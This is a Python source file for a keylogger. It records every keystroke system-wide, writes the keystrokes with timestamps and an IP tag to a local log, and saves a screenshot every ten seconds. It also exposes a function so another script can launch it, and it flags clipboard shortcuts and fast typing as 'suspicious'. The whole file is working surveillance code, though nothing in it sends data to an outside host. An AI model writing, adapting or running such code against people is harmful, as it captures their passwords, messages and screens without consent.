from mss import mss  # Screenshot capturing
from pynput.keyboard import Listener, Key
from threading import Thread
import time
import os
from datetime import datetime

# Define log directories
BASE_DIR = os.path.join(os.getcwd(), "keylogger_logs")
SCREENSHOT_DIR = os.path.join(BASE_DIR, "screenshots")
LOG_FILE = os.path.join(BASE_DIR, "keylog.txt")

# Ensure directories exist
os.makedirs(SCREENSHOT_DIR, exist_ok=True)
if not os.path.exists(LOG_FILE):
    open(LOG_FILE, "w").close()

# Global variables
keys = []
stop_keylogger_flag = False
user_ip = "UNKNOWN_IP"
last_typing_time = None  

# Special key mapping
SPECIAL_KEYS = {
    Key.space: " [SPACE] ",
    Key.enter: " [ENTER]\n",
    Key.backspace: " [BACKSPACE] ",
    Key.tab: " [TAB] ",
    Key.ctrl_l: " [CTRL] ",
    Key.ctrl_r: " [CTRL] ",
    Key.alt_l: " [ALT] ",
    Key.alt_r: " [ALT] ",
    Key.esc: " [ESC] ",
    Key.caps_lock: " [CAPSLOCK] ",
}

# Format captured keystrokes
def format_keys(keys):
    return "".join(SPECIAL_KEYS.get(key, str(key).replace("'", "")) for key in keys).strip()

# Log keystrokes to file
def write_log(keys):
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"\n[{timestamp}] [IP: {user_ip}]\n{format_keys(keys)}\n"

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)

        print(f"Logged: {log_entry.strip()}")
    except Exception as e:
        print(f"Error writing log: {e}")

# Capture key presses
def on_press(key):
    global keys, stop_keylogger_flag, last_typing_time

    if stop_keylogger_flag:
        return False

    try:
        keys.append(key.char if hasattr(key, 'char') and key.char else key)
    except Exception as e:
        print(f"Key capture error: {e}")

    # Detect suspicious clipboard activity
    if key in [Key.ctrl_l, Key.ctrl_r] and any(k in keys for k in ['c', 'v']):
        print("Suspicious clipboard activity detected: CTRL+C or CTRL+V")

    # Detect rapid typing
    current_time = time.time()
    if last_typing_time and (1 / (current_time - last_typing_time)) > 5:
        print("Suspicious fast typing detected")

    last_typing_time = current_time

    if len(keys) >= 10 or key == Key.enter:
        write_log(keys)
        keys = []

# Start keylogger
def keylogger():
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        print(f"Keylogger error: {e}")

# Capture screenshots at intervals
def take_screenshots():
    try:
        with mss() as sct:
            while not stop_keylogger_flag:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                screenshot_file = os.path.join(SCREENSHOT_DIR, f'{timestamp}.png')
                sct.shot(output=screenshot_file)
                print(f"Screenshot saved: {screenshot_file}")
                time.sleep(10)
    except Exception as e:
        print(f"Screenshot error: {e}")

# Start keylogger and screenshots
def start_keylogger():
    try:
        Thread(target=keylogger, daemon=True).start()
        Thread(target=take_screenshots, daemon=True).start()
        print(f"Keylogger and screenshots started for IP: {user_ip}. Logs saved in {BASE_DIR}")
    except Exception as e:
        print(f"Error starting keylogger: {e}")

# Stop the keylogger
def stop_keylogger():
    global stop_keylogger_flag
    stop_keylogger_flag = True
    print("Keylogger stopped.")

# Run keylogger from external script
def run_keylogger(log_dir=None, ip="UNKNOWN_IP"):
    global BASE_DIR, SCREENSHOT_DIR, LOG_FILE, user_ip

    if log_dir:
        BASE_DIR = log_dir
        SCREENSHOT_DIR = os.path.join(BASE_DIR, "screenshots")
        LOG_FILE = os.path.join(BASE_DIR, "keylog.txt")

    user_ip = ip
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()

    start_keylogger()
